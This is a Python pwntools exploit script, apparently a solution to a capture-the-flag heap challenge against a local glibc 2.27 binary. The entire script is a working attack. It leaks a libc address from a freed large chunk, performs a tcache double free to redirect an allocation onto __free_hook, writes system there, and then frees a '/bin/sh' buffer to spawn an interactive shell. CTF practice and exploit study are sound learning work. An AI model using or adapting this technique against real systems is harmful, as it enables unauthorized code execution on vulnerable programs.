from pwn import *
context(arch='amd64', os='linux', log_level='debug')
debug=0
file_name='./pwn'
if debug==1:
    #p=process(file_name)
    p=remote("127.0.0.1",8888)
    libc=ELF('/home/admin-pc/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
else:
    #p=remote('node4.buuoj.cn',29007)
    p=remote('127.0.0.1',10000)
    libc=ELF('/home/admin-pc/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6')
elf=ELF(file_name)

def choice(ch):
    p.sendlineafter('choice: ',str(ch))

def add(size,payload):
    choice(1)
    p.sendlineafter('message:',str(size))
    p.sendafter('message:',payload)
def free(idx):
    choice(2)
    p.sendlineafter('delete:',str(idx))
def edit(idx,payload):
    choice(3)
    p.sendlineafter('edit:',str(idx))
    p.sendlineafter('message:',payload)
def show(idx):
    choice(4)
    p.sendlineafter('display:',str(idx))

def recvlibc():
    return u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')

add(0x1000,b'a'*0x1000)#0
add(0x20,b'a'*0x10)#1
free(0)
add(0x20,b'a'*8)#2
show(2)
libc_addr=recvlibc()-96-0x10-libc.sym['__malloc_hook']-0x620
success('libc_addr: '+hex(libc_addr))

free(1)
free(1)
add(0x20,p64(libc_addr+libc.sym['__free_hook']))#3

add(0x20,b'/bin/sh\0')#4
add(0x20,p64(libc_addr+libc.sym['system']))#5
free(4)
p.interactive()
